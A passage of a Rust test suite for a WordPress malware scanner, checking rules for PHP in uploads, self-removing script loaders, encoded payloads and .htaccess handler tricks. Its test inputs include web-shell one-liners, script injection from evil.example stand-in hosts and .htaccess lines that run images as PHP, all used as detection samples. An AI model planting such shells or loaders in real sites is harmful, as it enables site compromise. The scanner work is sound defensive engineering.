            assert_eq!(ids(&h), ["php_in_uploads"], "{p}");
            assert_eq!(h[0].severity, Severity::High);
        }
    }

    #[test]
    fn uploads_must_be_a_whole_directory_name() {
        for p in [
            "my-uploads/x.php",
            "wp-content/uploads-old/x.php",
            "wp-content/Uploads/x.php",
            // A file called uploads is not a directory.
            "wp-content/uploads",
            "wp-content/uploads.php",
        ] {
            let h = inspect(p, b"<?php // nothing\n");
            assert!(!ids(&h).contains(&"php_in_uploads"), "{p}: {h:?}");
        }
    }

    #[test]
    fn php_under_uploads_ignores_other_dirs_and_non_php() {
        assert!(inspect("wp-content/plugins/p/image.php", b"<?php // nothing\n").is_empty());
        assert!(inspect("wp-content/uploads/2024/05/image.jpg", b"\xff\xd8\xff\xe0").is_empty());
        assert!(inspect("wp-content/uploadsx/a.php", b"<?php\n").is_empty());
    }

    #[test]
    fn is_php_like_covers_extensions_case_insensitive() {
        for p in [
            "a.php",
            "a.phtml",
            "a.phar",
            "a.php3",
            "a.php4",
            "a.php5",
            "a.php6",
            "a.php7",
            "a.php8",
            "a.pht",
            "a.inc",
            "x/y/A.PHP",
            "x/B.PhTmL",
            "d.d/a.Inc",
        ] {
            assert!(is_php_like(p), "{p}");
        }
        for p in [
            "a.js",
            "a.phps",
            "a.txt",
            "php",
            "dir.php/readme",
            "a.",
            ".htaccess",
            "a.pdf",
        ] {
            assert!(!is_php_like(p), "{p}");
        }
    }

    #[test]
    fn double_extension_counts_as_php_like() {
        assert!(is_php_like("wp-content/uploads/x.php.jpg"));
        assert!(is_php_like("wp-content/uploads/x.PHP.jpeg"));
        assert!(is_php_like("a.b.phtml.bak"));
        let h = inspect("wp-content/uploads/2024/x.php.jpg", b"GIF89a");
        assert_eq!(ids(&h), ["php_in_uploads"]);
    }

    #[test]
    fn inc_and_pht_count_only_as_the_final_extension() {
        for p in ["x.inc", "x.pht", "a/b.pdf.inc", "a.php.pht", "x.INC"] {
            assert!(is_php_like(p), "{p}");
        }
        for p in ["x.inc.pdf", "x.pht.jpg", "a.inc.b.txt"] {
            assert!(!is_php_like(p), "{p}");
        }
        for p in [
            "x.php.jpg",
            "x.php5.pdf",
            "x.phar.gz",
            "x.phtml.txt",
            "x.php8.bak",
        ] {
            assert!(is_php_like(p), "{p}");
        }
        let h = inspect("wp-content/uploads/2024/scan.inc.pdf", b"%PDF-1.4");
        assert!(h.is_empty(), "{h:?}");
        let h = inspect("wp-content/uploads/2024/x.inc", b"data");
        assert_eq!(ids(&h), ["php_in_uploads"]);
    }

    #[test]
    fn plain_remote_widget_loader_is_medium_not_high() {
        let tawk = b"var Tawk_API=Tawk_API||{},Tawk_LoadStart=new Date();(function(){var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0];s1.async=true;s1.src='https://embed.tawk.to/0000000000/default';s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);})();";
        let h = inspect("wp-content/themes/x/chat.js", tawk);
        assert_eq!(ids(&h), ["js_remote_script"], "{h:?}");
        assert_eq!(h[0].severity, Severity::Medium);
        assert_eq!(h[0].domains, ["embed.tawk.to"]);
        // Same shape in a PHP footer template stays Medium too.
        let crisp = b"<?php add_action('wp_footer', function () { echo '<script>window.$crisp=[];var d=document,s=d.createElement(\"script\");s.src=\"https://client.crisp.chat/l.js\";s.async=1;d.getElementsByTagName(\"head\")[0].appendChild(s);</script>'; });";
        let h = inspect("wp-content/themes/x/functions.php", crisp);
        assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
    }

    /// Real shape: wordfence's `wordfenceClass.php` hooks `wp_head` at byte 60054
    /// and holds a 258-byte character set at byte 236931. Far apart it is worth a
    /// look, never High: a first scan would otherwise alarm on it, and with no hit
    /// at all a payload padded away from its hook would be baselined unseen.
    #[test]
    fn a_hook_far_from_a_literal_is_medium_not_high() {
        let literal = "A".repeat(258);
        let filler = "// ordinary code\n".repeat(2000);
        for far in [
            format!("<?php\nadd_action('wp_head','x');\n{filler}$c='{literal}';\n"),
            format!("<?php\n$c='{literal}';\n{filler}add_action('wp_head','x');\n"),
        ] {
            let h = inspect("wp-content/plugins/p/p.php", far.as_bytes());
            let hit = h
                .iter()
                .find(|h| h.rule_id == "footer_hook_payload")
                .unwrap_or_else(|| panic!("no hit: {h:?}"));
            assert_eq!(hit.severity, Severity::Medium, "{h:?}");
            assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
        }
        // A hook with no payload anywhere is ordinary code.
        let plain = format!("<?php\nadd_action('wp_head','x');\n{filler}");
        assert!(inspect("wp-content/plugins/p/p.php", plain.as_bytes()).is_empty());
    }

    #[test]
    fn a_hook_next_to_a_literal_of_any_size_is_a_payload() {
        for size in [300, 8_000, 200_000] {
            let literal = "A".repeat(size);
            for src in [
                format!("<?php\nadd_action('wp_footer','x');\n$c='{literal}';\n"),
                format!("<?php\n$c='{literal}';\nadd_action('wp_footer','x');\n"),
            ] {
                let h = inspect("wp-content/themes/t/functions.php", src.as_bytes());
                assert!(ids(&h).contains(&"footer_hook_payload"), "{size}: {h:?}");
            }
        }
    }

    /// Real shape: really-simple-ssl's bundle. React's `useEffect` cleanup removes
    /// the tag when the component goes away, not once it has loaded. A remote script
    /// is still worth a look, at the lower severity.
    #[test]
    fn a_reacts_cleanup_is_not_a_self_removing_loader() {
        for src in [
            &br#"const l=document.createElement("script");return l.src="https://hcaptcha.example/1/api.js",l.async=!0,l.onload=()=>{go()},document.body.appendChild(l),()=>{window.h&&window.h.reset(),l&&l.remove()}"#[..],
            br#"const script = document.createElement('script');
script.src = 'https://widget.example/w.js';
document.body.appendChild(script);
return () => {
  document.body.removeChild(script);
};"#,
            br#"var s=document.createElement('script');s.src='https://widget.example/w.js';document.body.appendChild(s);return function(){document.body.removeChild(s)};"#,
        ] {
            let h = inspect("a.js", src);
            assert!(!ids(&h).contains(&"js_self_removing_loader"), "{h:?}");
            assert!(ids(&h).contains(&"js_remote_script"), "{h:?}");
        }
    }

    /// An imitation of the cleanup shape, with the removal outside any function
    /// body, is still the incident's behaviour.
    #[test]
    fn a_cleanup_imitation_outside_a_function_stays_high() {
        for src in [
            &br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s),()=>0;s.remove();"#[..],
            br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s),()=>{};s.remove();"#,
            br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s);function(){return 0};s.parentNode.removeChild(s);"#,
        ] {
            let h = inspect("a.js", src);
            let hit = h
                .iter()
                .find(|h| h.rule_id == "js_self_removing_loader")
                .unwrap_or_else(|| panic!("no hit: {h:?}"));
            assert_eq!(hit.severity, Severity::High);
        }
    }

    #[test]
    fn removal_when_it_has_loaded_stays_a_self_removing_loader() {
        for src in [
            &br#"var s=document.createElement('script');s.src='https://x.example/a.js';s.onload=()=>s.remove();document.head.appendChild(s);"#[..],
            br#"var s=document.createElement('script');s.src='https://x.example/a.js';s.onload=function(){s.parentNode.removeChild(s)};document.head.appendChild(s);"#,
            br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s);s.onload=()=>{s.remove()};"#,
        ] {
            let h = inspect("a.js", src);
            assert!(ids(&h).contains(&"js_self_removing_loader"), "{h:?}");
        }
    }

    #[test]
    fn self_removing_remote_loader_variants_are_high() {
        for src in [
            &br#"var s=document.createElement('script');s.setAttribute('src','//malicious-loader.example/a.js');document.body.appendChild(s);s.remove();"#[..],
            br#"var s=document.createElement("script");s.src="https://malicious-loader.example/a.js";document.head.appendChild(s);document.head.removeChild(s);"#,
        ] {
            let h = inspect("a.js", src);
            assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
            assert!(ids(&h).contains(&"js_self_removing_loader"));
        }
        // Removal of a script that is not remote does not count.
        let h = inspect(
            "a.js",
            b"var s=document.createElement('script');s.src='/local.js';document.head.appendChild(s);s.remove();",
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn snippet_at_most_120_chars() {
        let mut src = b"<?php eval(base64_decode('".to_vec();
        src.extend(std::iter::repeat_n(b'A', 5000));
        src.extend_from_slice(b"'));");
        let h = inspect("a.php", &src);
        assert!(!h.is_empty());
        for hit in &h {
            assert!(hit.snippet.chars().count() <= 120, "{}", hit.snippet.len());
        }
        // Multibyte text counts characters, not bytes.
        let mut src = b"<?php eval(base64_decode('".to_vec();
        src.extend("\u{20ac}".repeat(400).as_bytes());
        let h = inspect("a.php", &src);
        assert!(h[0].snippet.chars().count() <= 120);
    }

    #[test]
    fn snippet_replaces_control_chars_and_bad_utf8() {
        let src = b"<?php eval(base64_decode(\x07\x1b[31m\xff\xfe\x00 'x'));";
        let h = inspect("a.php", src);
        assert!(!h.is_empty());
        let s = &h[0].snippet;
        assert!(s.starts_with("eval(base64_decode("));
        assert!(!s.chars().any(|c| c.is_control()), "{s:?}");
    }

    #[test]
    fn snippet_stops_at_line_end() {
        let h = inspect("a.php", b"<?php\neval(base64_decode('x'));\n$other = 1;\n");
        assert_eq!(h[0].line, 2);
        assert_eq!(h[0].snippet, "eval(base64_decode('x'));");
    }

    #[test]
    fn binary_input_does_not_panic() {
        let mut junk = Vec::new();
        let mut x: u32 = 0x9e37_79b9;
        for _ in 0..300_000 {
            x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            junk.push((x >> 24) as u8);
        }
        for p in [
            "a.php",
            "a.js",
            "a.bin",
            "wp-content/uploads/a.php",
            "class-wp-x.php",
        ] {
            let _ = inspect(p, &junk);
        }
        let _ = inspect("a.php", &[]);
        let _ = inspect("a.php", b"\xff\xfe\x00\x00");
    }

    #[test]
    fn hits_are_capped_at_20() {
        let mut src = b"<?php\n".to_vec();
        for i in 0..500 {
            src.extend_from_slice(
                format!("eval(base64_decode('{i}')); system($_GET['c']);\n").as_bytes(),
            );
        }
        let h = inspect("a.php", &src);
        assert_eq!(h.len(), MAX_HITS);
        assert!(h.windows(2).all(|w| w[0].line <= w[1].line));
    }

    #[test]
    fn domains_are_deduped_and_capped() {
        let mut line = String::from("<?php eval(base64_decode('x')); ");
        for i in 0..30 {
            line.push_str(&format!(
                "http://h{i}.example/a https://H{i}.example:8080/b "
            ));
        }
        let h = inspect("a.php", line.as_bytes());
        assert_eq!(h[0].domains.len(), MAX_DOMAINS);
        assert_eq!(h[0].domains[0], "h0.example");
        assert_eq!(h[0].domains[1], "h1.example");
    }

    #[test]
    fn domains_come_from_the_matched_line_only() {
        let h = inspect(
            "a.php",
            b"<?php // https://elsewhere.example/\neval(base64_decode('x')); // https://here.example/p?q=1\n// https://later.example\n",
        );
        assert_eq!(h[0].domains, ["here.example"]);
    }

    #[test]
    fn domain_extraction_handles_userinfo_and_junk() {
        let h = inspect(
            "a.php",
            b"<?php eval(base64_decode('x')); // http://good.example@evil.example/p http://localhost/ https:// http://-/",
        );
        assert_eq!(h[0].domains, ["evil.example"]);
    }

    #[test]
    fn core_named_decoy_with_a_content_hit_is_flagged() {
        let mut src = b"<?php\nadd_action('wp_footer','x');\n$b='".to_vec();
        src.extend(std::iter::repeat_n(b'Q', 400));
        src.extend_from_slice(b"';\n");
        let h = inspect("wp-content/plugins/p/class-wp-http-cache.php", &src);
        assert!(ids(&h).contains(&"footer_hook_payload"), "{h:?}");
        assert!(ids(&h).contains(&"core_name_decoy"), "{h:?}");
        // Same content under a neutral name: no decoy hit.
        let h = inspect("wp-content/plugins/p/helpers.php", &src);
        assert!(!ids(&h).contains(&"core_name_decoy"));
        // A core-looking name with no content hit is not a finding.
        assert!(inspect("wp-content/plugins/p/class-wp-thing.php", b"<?php echo 1;").is_empty());
    }

    #[test]
    fn large_encoded_literal_in_plain_php_is_medium() {
        let mut src = b"<?php $d = \"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 3500));
        src.extend_from_slice(b"\";");
        let h = inspect("wp-content/themes/x/inc/data.php", &src);
        assert_eq!(ids(&h), ["encoded_literal_large"]);
        assert_eq!(h[0].severity, Severity::Medium);
        // Just under the line stays clean.
        let mut src = b"<?php $d = \"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 2900));
        src.extend_from_slice(b"\";");
        assert!(inspect("a.php", &src).is_empty());
    }

    #[test]
    fn large_encoded_image_or_font_is_clean() {
        // An admin menu icon: base64 of `<svg …`. Same for PNG, GIF, JPEG,
        // `<?xml`, WebP and WOFF/WOFF2 headers.
        for prefix in [
            "PHN2Zy",
            "iVBORw0KGgo",
            "R0lGODlh",
            "/9j/4AAQ",
            "PD94bWwg",
            "UklGRg",
            "d09GRg",
            "d09GMg",
        ] {
            let mut src = format!("<?php $icon = '{prefix}").into_bytes();
            src.extend(std::iter::repeat_n(b'a', 3500));
            src.extend_from_slice(b"';");
            assert!(
                inspect("wp-content/plugins/p/menu.php", &src).is_empty(),
                "{prefix}"
            );
        }
        // The same length of anything else still counts.
        let mut src = b"<?php $d = 'ZXZhbCgk".to_vec();
        src.extend(std::iter::repeat_n(b'a', 3500));
        src.extend_from_slice(b"';");
        assert_eq!(ids(&inspect("a.php", &src)), ["encoded_literal_large"]);
    }

    #[test]
    fn silence_stub_index_under_uploads_is_clean() {
        for src in [
            &b"<?php\n// Silence is golden.\n"[..],
            b"<?php // Silence is golden",
            b"\xEF\xBB\xBF<?php\n/* nothing */\n?>\n",
            b"<?php\n# keep out\n// and again\n",
            b"<?php\n",
            // WP All Import `touch()`es its index.php: an empty file.
            b"",
            b" \n",
            // All-in-One WP Migration's: plain text, nothing PHP runs.
            b"Kangaroos cannot jump here",
            b"\xEF\xBB\xBFSilence is golden.\n",
        ] {
            let h = inspect("wp-content/uploads/wpallimport/logs/abc/index.php", src);
            assert!(h.is_empty(), "{:?}: {h:?}", String::from_utf8_lossy(src));
            assert!(
                is_access_guard("wp-content/plugins/p/storage/index.php", src),
                "{:?}",
                String::from_utf8_lossy(src)
            );
        }
    }

    #[test]
    fn index_with_markup_is_not_a_stub() {
        // Served as HTML: a redirect or a script is not a stub, PHP or not.
        for src in [
            &b"<script src=\"https://evil.example/x.js\"></script>"[..],
            b"<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
            b"<? system($_GET['c']);",
        ] {
            let h = inspect("wp-content/uploads/x/index.php", src);
            assert_eq!(
                ids(&h)[0],
                "php_in_uploads",
                "{:?}",
                String::from_utf8_lossy(src)
            );
            assert!(!is_access_guard("wp-content/plugins/p/index.php", src));
        }
    }

    /// All-in-One WP Migration's `storage/.htaccess`, as it writes it.
    const AI1WM_STORAGE_HTACCESS: &str = "<IfModule mod_authz_core.c>\n\t<FilesMatch \".*\">\n\t\tRequire all denied\n\t</FilesMatch>\n\t<FilesMatch \"\\.log$\">\n\t\tRequire all granted\n\t</FilesMatch>\n</IfModule>\n<IfModule !mod_authz_core.c>\n\tOrder allow,deny\n\tDeny from all\n\t<FilesMatch \"\\.log$\">\n\t\tOrder allow,deny\n\t\tAllow from all\n\t</FilesMatch>\n</IfModule>\n<IfModule mod_mime.c>\n\tAddType text/plain .log\n</IfModule>\n<IfModule mod_dir.c>\n\tDirectoryIndex index.php\n</IfModule>\n<IfModule mod_autoindex.c>\n\tOptions -Indexes\n</IfModule>";

    #[test]
    fn access_only_htaccess_is_a_guard() {
        for src in [
            AI1WM_STORAGE_HTACCESS,
            "deny from all\n",
            "# keep out\nOrder Deny,Allow\r\nDeny from all\n",
            "<Files *.php>\nRequire all denied\n</Files>\n",
            "Options -Indexes -ExecCGI\n",
            "",
        ] {
            assert!(
                is_access_guard("wp-content/plugins/p/storage/.htaccess", src.as_bytes()),
                "{src:?}"
            );
        }
    }

    #[test]
    fn htaccess_that_changes_what_runs_is_not_a_guard() {
        for src in [
            "AddHandler application/x-httpd-php .jpg\n",
            "AddType application/x-httpd-php .jpg\n",
            "<FilesMatch \"\\.jpg$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n",
            "php_value auto_prepend_file /tmp/x\n",
            "RewriteEngine On\nRewriteRule .* https://evil.example [R]\n",
            "Options +Indexes\n",
            "Options ExecCGI\n",
            "ErrorDocument 404 /x.php\n",
            // A continued line hides what follows it.
            "Deny from all \\\nAddHandler php .jpg\n",
            "Require expr true\n",
            "Deny from all\rAddHandler application/x-httpd-php .jpg\n",
        ] {
            assert!(
                !is_access_guard("wp-content/plugins/p/storage/.htaccess", src.as_bytes()),
                "{src:?}"
            );
        }
        // Other names are never guards, and a guard is small.
        assert!(!is_access_guard("wp-content/plugins/p/x.php", b""));
        assert!(!is_access_guard("wp-content/plugins/p/.user.ini", b""));
        let big = "deny from all\n".repeat(400);
        assert!(!is_access_guard("p/.htaccess", big.as_bytes()));
    }

    #[test]
    fn index_with_code_or_tricks_under_uploads_is_still_high() {
        for src in [
            // `?>` inside a line comment ends PHP mode: what follows runs.
            &b"<?php // x ?><?php system($_GET['c']);\n"[..],
            b"<?php // ok\necho 1;\n",
            b"<?php /* open comment\n",
            b"<?php ?>\n<h1>hi</h1>\n",
            b"<?php\n#[Attr]\n",
            b"<?= 'x' ?>\n",
        ] {
            let h = inspect("wp-content/uploads/x/index.php", src);
            assert_eq!(
                ids(&h)[0],
                "php_in_uploads",
                "{:?}",
                String::from_utf8_lossy(src)
            );
        }
        // Only `index.php` is a stub; any other name is reported however empty.
        let h = inspect("wp-content/uploads/x/functions.php", b"<?php\n// nothing\n");
        assert_eq!(ids(&h), ["php_in_uploads"]);
        // A stub is short.
        let mut big = b"<?php\n".to_vec();
        for _ in 0..100 {
            big.extend_from_slice(b"// padding padding\n");
        }
        assert_eq!(
            ids(&inspect("wp-content/uploads/x/index.php", &big)),
            ["php_in_uploads"]
        );
    }

    /// A compiled template as WPML's bundled Twig 1 writes it
    /// (`ModuleNode::compileClassHeader`): no indent at the top level, the
    /// class name cut out of `\WPML\Core\__TwigTemplate_<sha256>`.
    const WPML_TWIG: &str = "<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\nuse \\WPML\\Core\\Twig\\Error\\LoaderError;\nuse \\WPML\\Core\\Twig\\Error\\RuntimeError;\nuse \\WPML\\Core\\Twig\\Markup;\nuse \\WPML\\Core\\Twig\\Sandbox\\SecurityError;\nuse \\WPML\\Core\\Twig\\Sandbox\\SecurityNotAllowedTagError;\nuse \\WPML\\Core\\Twig\\Sandbox\\SecurityNotAllowedFilterError;\nuse \\WPML\\Core\\Twig\\Sandbox\\SecurityNotAllowedFunctionError;\nuse \\WPML\\Core\\Twig\\Source;\nuse \\WPML\\Core\\Twig\\Template;\n\n/* language-switcher.twig */\nclass __TwigTemplate_9f2c7e1b4a0d8c3e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708192a extends \\WPML\\Core\\Twig\\Template\n{\n    public function __construct(Environment $env)\n    {\n        parent::__construct($env);\n\n        $this->parent = false;\n\n        $this->blocks = [\n        ];\n    }\n\n    protected function doDisplay(array $context, array $blocks = [])\n    {\n        // line 1\n        echo \"<div class=\\\"wpml-ls\\\">\";\n        echo \\WPML\\Core\\twig_escape_filter($this->env, $this->getAttribute(($context[\"strings\"] ?? null), \"title\", []), \"html\", null, true);\n        echo \"</div>\";\n    }\n\n    public function getTemplateName()\n    {\n        return \"language-switcher.twig\";\n    }\n}\n";
    const WPML_TWIG_PATH: &str = "wp-content/uploads/cache/wpml/twig/3b/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd923.php";

    #[test]
    fn twig_cache_under_uploads_is_not_php_in_uploads() {
        assert!(is_twig_cache(WPML_TWIG_PATH, WPML_TWIG.as_bytes()));
        let h = inspect(WPML_TWIG_PATH, WPML_TWIG.as_bytes());
        assert!(h.is_empty(), "{h:?}");
        // Twig 3 on PHP 8.1+ hashes with xxh128, and an embedded template
        // gets `___<n>`.
        let x = WPML_TWIG.replace(
            "9f2c7e1b4a0d8c3e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708192a",
            "0a1b2c3d4e5f60718293a4b5c6d7e8f9___1",
        );
        for p in [
            "wp-content/uploads/cache/timber/c0/c0d9751840e38e635a0a6877a2948ae8.php",
            "wp-content/uploads/sites/2/cache/wpml/twig/c0/c0d9751840e38e635a0a6877a2948ae815af7578988ce54088f68ead70eda61a.php",
        ] {
            assert!(is_twig_cache(p, x.as_bytes()), "{p}");
            assert!(inspect(p, x.as_bytes()).is_empty(), "{p}");
        }
    }

    #[test]
    fn only_twigs_own_shape_is_a_twig_cache() {
        let ok = "wp-content/uploads/cache/wpml/twig/3b/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd923.php";
        for p in [
            // The folder must be the hash's first two characters.
            "wp-content/uploads/cache/wpml/twig/3c/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd923.php",
            "wp-content/uploads/cache/wpml/twig/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd923.php",
            // Lower-case hex of 32 or 64, `.php`.
            "wp-content/uploads/cache/wpml/twig/3B/3B64BAE642A1AAD834561A17143CAC388FA0098B3B821C673E2C7CB3F7EDD923.php",
            "wp-content/uploads/cache/wpml/twig/3b/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd92.php",
            "wp-content/uploads/cache/wpml/twig/3b/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd9zz.php",
            "wp-content/uploads/cache/wpml/twig/3b/3b64bae642a1aad834561a17143cac388fa0098b3b821c673e2c7cb3f7edd923.phtml",
            "wp-content/uploads/cache/wpml/twig/3b/shell.php",
        ] {
            assert!(!is_twig_cache(p, WPML_TWIG.as_bytes()), "{p}");
            assert_eq!(ids(&inspect(p, WPML_TWIG.as_bytes())), ["php_in_uploads"], "{p}");
        }
        for src in [
            // No class line, or one that isn't Twig's.
            "<?php\n\nnamespace WPML\\Core;\n\n/* x.twig */\n".to_string(),
            WPML_TWIG.replace("class __TwigTemplate_", "class TwigTemplate_"),
            WPML_TWIG.replace("\nclass __TwigTemplate_", "\n// class __TwigTemplate_"),
            // Something before the open tag.
            format!("GIF89a{WPML_TWIG}"),
            format!(" {WPML_TWIG}"),
            // A class line past the head is not Twig's header.
            format!("<?php\n{}\n{}", "// pad\n".repeat(600), &WPML_TWIG[6..]),
        ] {
            assert!(!is_twig_cache(ok, src.as_bytes()), "{src:.80?}");
            assert_eq!(
                ids(&inspect(ok, src.as_bytes())),
                ["php_in_uploads"],
                "{src:.80?}"
            );
        }
    }

    #[test]
    fn code_in_a_twig_cache_file_is_still_found() {
        let src = WPML_TWIG.replace(
            "// line 1\n",
            "// line 1\n        eval(base64_decode($_POST['x']));\n",
        );
        assert!(is_twig_cache(WPML_TWIG_PATH, src.as_bytes()));
        let h = inspect(WPML_TWIG_PATH, src.as_bytes());
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(!ids(&h).contains(&"php_in_uploads"), "{h:?}");
    }

    #[test]
    fn wp_all_import_functions_is_not_php_in_uploads() {
        let src = b"<?php\nfunction my_price($p) { return round((float) $p * 1.21, 2); }\n";
        for p in [
            "wp-content/uploads/wpallimport/functions.php",
            "wp-content/uploads/sites/3/wpallimport/functions.php",
            "blog/wp-content/uploads/wpallimport/functions.php",
        ] {
            assert!(is_wp_all_import_functions(p), "{p}");
            assert!(inspect(p, src).is_empty(), "{p}");
        }
        for p in [
            "wp-content/uploads/wpallimport/other.php",
            "wp-content/uploads/wpallimport/files/functions.php",
            "wp-content/uploads/2026/wpallimport/functions.php",
            "wp-content/uploads/sites/x/wpallimport/functions.php",
            "wp-content/uploads/sites//wpallimport/functions.php",
            "wp-content/uploads/wpallimport/functions.php.jpg",
            "wp-content/uploads/xwpallimport/functions.php",
        ] {
            assert!(!is_wp_all_import_functions(p), "{p}");
            assert_eq!(ids(&inspect(p, src)), ["php_in_uploads"], "{p}");
        }
        // Its code is still read.
        let h = inspect(
            "wp-content/uploads/wpallimport/functions.php",
            b"<?php\neval(base64_decode($_POST['x']));\n",
        );
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
    }

    #[test]
    fn data_uri_in_a_footer_hook_is_clean() {
        let mut src =
            b"<?php add_action('wp_footer', function () { echo '<img src=\"data:image/png;base64,"
                .to_vec();
        src.extend(std::iter::repeat_n(b'A', 4000));
        src.extend_from_slice(b"\">'; });");
        assert!(inspect("a.php", &src).is_empty());
    }

    #[test]
    fn php_rules_do_not_run_on_js() {
        let mut src = b"var d=\"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 4000));
        src.extend_from_slice(b"\";eval(base64_decode('x'));");
        assert!(inspect("a.js", &src).is_empty());
    }

    #[test]
    fn unknown_file_types_are_not_inspected() {
        assert!(inspect("a.txt", b"eval(base64_decode('x'));").is_empty());
        assert!(inspect("a", b"eval(base64_decode('x'));").is_empty());
    }

    #[test]
    fn oversize_inspected_files_are_reported_not_skipped() {
        let big = vec![b' '; INSPECT_MAX_BYTES + 1];
        for p in ["a.php", "a.js", "a.mjs", "a.cjs", "a.html", "a.htm"] {
            let h = inspect(p, &big);
            assert_eq!(ids(&h), ["too_large_to_inspect"], "{p}");
            assert_eq!(h[0].severity, Severity::Medium);
            // Exactly at the cap is inspected, not flagged.
            assert!(inspect(p, &big[..INSPECT_MAX_BYTES]).is_empty(), "{p}");
        }
        // Types that are never inspected stay silent.
        assert!(inspect("a.txt", &big).is_empty());
    }

    #[test]
    fn loader_appended_past_the_cap_is_not_read_as_clean() {
        let mut big = vec![b' '; INSPECT_MAX_BYTES];
        big.extend_from_slice(fx!("appended_js_loader.js"));
        let h = inspect("wp-content/themes/x/bundle.js", &big);
        assert_eq!(ids(&h), ["too_large_to_inspect"]);
    }

    #[test]
    fn hit_inside_the_cap_survives_oversize_input() {
        let mut big = b"<?php eval(base64_decode('x'));".to_vec();
        big.resize(INSPECT_MAX_BYTES + 10, b' ');
        let h = inspect("a.php", &big);
        assert!(ids(&h).contains(&"eval_decoder"));
        assert!(ids(&h).contains(&"too_large_to_inspect"));
    }

    #[test]
    fn hostile_inputs_stay_linear() {
        let n = INSPECT_MAX_BYTES;
        let inputs: Vec<Vec<u8>> = vec![
            // Many quote starts each followed by a long base64 run.
            "'aaaaaaaaaaaaaaaa".repeat(n / 17).into_bytes(),
            // Opening forms that never complete.
            "eval(   ".repeat(n / 8).into_bytes(),
            "createElement('script')".repeat(n / 23).into_bytes(),
            "http://".repeat(n / 7).into_bytes(),
            "eval(@(((((".repeat(n / 11).into_bytes(),
            vec![b'A'; n],
            vec![b'"'; n],
        ];
        let started = std::time::Instant::now();
        for src in &inputs {
            for p in ["a.php", "a.js"] {
                let h = inspect(p, src);
                assert!(h.len() <= MAX_HITS);
            }
        }
        assert!(started.elapsed().as_secs() < 60, "{:?}", started.elapsed());
    }
}
